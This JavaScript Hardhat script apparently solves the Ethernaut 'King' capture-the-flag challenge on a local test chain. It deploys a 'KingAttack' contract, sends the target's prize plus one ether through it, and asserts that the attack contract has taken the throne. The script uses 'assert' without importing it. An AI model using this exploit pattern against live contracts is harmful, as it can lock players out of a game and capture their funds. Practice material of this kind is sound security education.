const { ethers } = require("hardhat");
require("dotenv").config();
const CONTRACT_ADDRESS = "0x06cd7788D77332cF1156f1E327eBC090B5FF16a3";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
// Create a JsonRpcProvider instance that connects to the local network
const provider = new ethers.providers.JsonRpcProvider("http://localhost:8545");

//   Create a wallet instance (for signing transactions)
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  // Deploy the Contract
  const KingContractAttack = await ethers.getContractFactory(
    "KingAttack",
    signer
  );
  const kingContractAttack = await KingContractAttack.deploy(
    PLAYER_ADDRESS,
    CONTRACT_ADDRESS
  );
  await kingContractAttack.deployed();
  console.log("PayableContract deployed to:", kingContractAttack.address);

  const contractInterface = [
    "function _king() external view returns (address)",
    "function prize() external view returns (uint)",
  ];
  const contract = new ethers.Contract(
    CONTRACT_ADDRESS,
    contractInterface,
    wallet
  );
  assert.equal(
    CONTRACT_ADDRESS,
    await kingContractAttack.recipient(),
    "contract address differ"
  );
  const prizeInWei = await contract.prize();

  const amountToSend = prizeInWei.add(ethers.utils.parseEther("1"));

  await kingContractAttack.transfer({
    value: amountToSend.toString(),
  });

  assert.equal(await contract._king(), kingContractAttack.address);
}
main().catch((error) => {
  console.error(error);
  process.exit(1);
});
